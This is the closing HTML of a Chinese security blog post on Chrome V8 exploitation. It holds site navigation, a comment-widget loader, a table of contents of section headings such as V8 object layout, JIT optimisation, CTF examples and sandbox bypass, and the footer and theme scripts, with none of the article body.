                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2024/11/08/linux-heap-exploit-basic-knowlege/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">linux 堆利用基础知识</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
                <div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

            </div>
        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">Chrome V8 Pwn</div>
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="nav-text">背景知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A1%86%E6%9E%B6"><span class="nav-text">浏览器框架</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JS-%E5%BC%95%E6%93%8E"><span class="nav-text">JS 引擎</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JS%E5%BC%95%E6%93%8E%E6%B5%81%E6%B0%B4%E7%BA%BF%E6%9C%BA%E5%88%B6"><span class="nav-text">JS引擎流水线机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81-JS-%E5%BC%95%E6%93%8E%E6%9E%B6%E6%9E%84"><span class="nav-text">常见 JS 引擎架构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99"><span class="nav-text">相关资料</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ubuntu-18-04"><span class="nav-text">ubuntu 18.04</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E8%AF%91-v8"><span class="nav-text">编译 v8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-v8"><span class="nav-text">调试 v8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85-turbolizer"><span class="nav-text">安装 turbolizer</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ubuntu-20-04-%E5%8F%8A%E4%BB%A5%E4%B8%8A%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="nav-text">ubuntu 20.04 及以上（推荐）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E8%AF%91-v8-1"><span class="nav-text">编译 v8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85-turbolizer-1"><span class="nav-text">安装 turbolizer</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%88%A9%E7%94%A8%E5%B8%B8%E7%94%A8%E7%9A%84class"><span class="nav-text">浏览器利用常用的class</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E7%BB%84-Array"><span class="nav-text">数组 Array</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ArrayBuffer-%E5%92%8C-DataView"><span class="nav-text">ArrayBuffer 和 DataView</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ArrayBuffer"><span class="nav-text">ArrayBuffer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DataView"><span class="nav-text">DataView</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BE%E4%BE%8B"><span class="nav-text">举例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WASM%EF%BC%88WebAssembly%EF%BC%89"><span class="nav-text">WASM（WebAssembly）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#V8-%E7%9A%84-object-%E9%80%9A%E7%94%A8%E7%BB%93%E6%9E%84"><span class="nav-text">V8 的 object 通用结构</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Hidden-Class-Map"><span class="nav-text">Hidden Class (Map)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Properties"><span class="nav-text">Properties</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Inline-Property"><span class="nav-text">Inline Property</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fast-Properties"><span class="nav-text">Fast Properties</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dictionary-Properties"><span class="nav-text">Dictionary Properties</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Elements"><span class="nav-text">Elements</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Packed-Elements-Holey-Elements"><span class="nav-text">Packed Elements &amp; Holey Elements</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fast-Elements-Dictionary-Elements"><span class="nav-text">Fast Elements &amp; Dictionary Elements</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%B1%BB%E5%9E%8B%E7%BB%93%E6%9E%84"><span class="nav-text">常见类型结构</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Smi"><span class="nav-text">Smi</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HeapObject-%E6%8C%87%E9%92%88"><span class="nav-text">HeapObject 指针</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Heap-Number"><span class="nav-text">Heap Number</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#String"><span class="nav-text">String</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JSArray"><span class="nav-text">JSArray</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JSArrayBuffer"><span class="nav-text">JSArrayBuffer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JSTypedArray"><span class="nav-text">JSTypedArray</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JSDataView"><span class="nav-text">JSDataView</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JSMap"><span class="nav-text">JSMap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#set"><span class="nav-text">set</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#delete"><span class="nav-text">delete</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Inline-Cache"><span class="nav-text">Inline Cache</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E7%9A%84%E9%9A%90%E8%97%8F%E7%B1%BB%EF%BC%88Hidden-Class%EF%BC%89"><span class="nav-text">对象的隐藏类（Hidden Class）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9A%90%E8%97%8F%E7%B1%BB%E5%8F%98%E8%BF%81%EF%BC%88Map-Transition%EF%BC%89"><span class="nav-text">隐藏类变迁（Map Transition）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B1%BB%E5%9E%8B%E5%8F%8D%E9%A6%88%E5%90%91%E9%87%8F%EF%BC%88type-feedback-vector%EF%BC%89"><span class="nav-text">类型反馈向量（type feedback vector）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IC%E7%8A%B6%E6%80%81%E6%9C%BA"><span class="nav-text">IC状态机</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GC"><span class="nav-text">GC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GC-%E7%9A%84%E7%A9%BA%E9%97%B4%E5%88%92%E5%88%86"><span class="nav-text">GC 的空间划分</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Yong-Generation"><span class="nav-text">Yong Generation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#New-Space"><span class="nav-text">New Space</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cheney%E2%80%99s-algorithm"><span class="nav-text">Cheney’s algorithm</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Old-Generation"><span class="nav-text">Old Generation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#old-space"><span class="nav-text">old space</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#code-space"><span class="nav-text">code space</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#map-space"><span class="nav-text">map space</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mark-Sweep-Compact"><span class="nav-text">Mark-Sweep-Compact</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Other"><span class="nav-text">Other</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Write-Barrier"><span class="nav-text">Write Barrier</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9AStarCTF-2019-OOB"><span class="nav-text">例题：StarCTF 2019 OOB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2-Map"><span class="nav-text">泄露 Map</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86"><span class="nav-text">类型混淆</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99"><span class="nav-text">任意地址读写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="nav-text">劫持程序执行流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-WebAssembly-%E5%86%99-shellcode"><span class="nav-text">利用 WebAssembly 写 shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81-free-hook"><span class="nav-text">劫持 __free_hook</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Heap-Sandbox"><span class="nav-text">Heap Sandbox</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8C%87%E9%92%88%E5%8E%8B%E7%BC%A9"><span class="nav-text">指针压缩</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1"><span class="nav-text">沙箱</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87"><span class="nav-text">沙箱绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E7%AB%8B%E5%8D%B3%E6%95%B0%E5%86%99-shellcode"><span class="nav-text">利用立即数写 shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-WasmInstance-%E7%9A%84%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="nav-text">利用 WasmInstance 的全局变量</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A0%86%E5%96%B7%E4%BC%AA%E9%80%A0%E5%AF%B9%E8%B1%A1"><span class="nav-text">堆喷伪造对象</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#v8-%E5%A0%86%E5%9D%97%E7%AE%A1%E7%90%86%E7%BB%93%E6%9E%84"><span class="nav-text">v8 堆块管理结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%AF%B9%E8%B1%A1%E4%BC%AA%E9%80%A0"><span class="nav-text">任意地址对象伪造</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JustinTimeCompiler"><span class="nav-text">JustinTimeCompiler</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%84%E6%B5%8B%E4%BC%98%E5%8C%96"><span class="nav-text">预测优化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="nav-text">工作原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Sea-of-Nodes"><span class="nav-text">Sea of Nodes</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-text">基本概念</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SSA-static-single-assignment"><span class="nav-text">SSA(static single assignment)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CFG-Control-Flow-Graph"><span class="nav-text">CFG(Control Flow Graph)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DFG-Data-Flow-Graph"><span class="nav-text">DFG(Data Flow Graph)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%9D%E8%B5%96"><span class="nav-text">依赖</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E4%BE%9D%E8%B5%96"><span class="nav-text">数据依赖</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Effect%E4%BE%9D%E8%B5%96"><span class="nav-text">Effect依赖</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%A7%E5%88%B6%E4%BE%9D%E8%B5%96"><span class="nav-text">控制依赖</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E7%AC%A6%E7%9A%84%E7%89%B9%E4%BE%8B%E5%8C%96"><span class="nav-text">操作符的特例化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JIT%E5%B8%B8%E8%A7%81%E4%BC%98%E5%8C%96"><span class="nav-text">JIT常见优化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Type-and-Range-Analysis"><span class="nav-text">Type and Range Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%84%E7%BA%A6-Reduction"><span class="nav-text">规约(Reduction)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E9%87%8F%E6%8A%98%E5%8F%A0-constant-folding"><span class="nav-text">常量折叠(constant folding)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%BA%E5%BA%A6%E6%8A%98%E5%87%8F%EF%BC%88strength-reduction%EF%BC%89"><span class="nav-text">强度折减（strength reduction）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Typed-Lowering"><span class="nav-text">Typed Lowering</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Global-Value-Numbering"><span class="nav-text">Global Value Numbering</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%A7%E5%88%B6%E4%BC%98%E5%8C%96"><span class="nav-text">控制优化</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Inline"><span class="nav-text">Inline</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Escape-Analysis"><span class="nav-text">Escape Analysis</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#V8%E6%B5%81%E6%B0%B4%E7%BA%BF"><span class="nav-text">V8流水线</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A34c3-v9"><span class="nav-text">例题：34c3 v9</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A35c3-krautflare"><span class="nav-text">例题：35c3 krautflare</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-2"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9AGoogleCTF2018-Just-In-Time"><span class="nav-text">例题：GoogleCTF2018 Just In Time</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-3"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2"><span class="nav-text">漏洞利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Hole"><span class="nav-text">Hole</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2021-38003"><span class="nav-text">CVE-2021-38003</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A2023XCTF-Final-Hole"><span class="nav-text">例题：2023XCTF Final Hole</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2022-4174"><span class="nav-text">CVE-2022-4174</span></a></li></ol></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2022</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        21 posts in total
                    </span>
                    
                        <span>
                            347.7k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fa-regular fa-comments"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fa-solid fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fa-solid fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>



    
<script src="/js/tools/localSearch.js" type="module"></script>




    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>




    
<script src="/js/libs/mermaid.min.js"></script>

    
<script src="/js/plugins/mermaid.js"></script>






    
<script src="/js/libs/anime.min.js"></script>





    
<script src="/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>




</body>
</html>
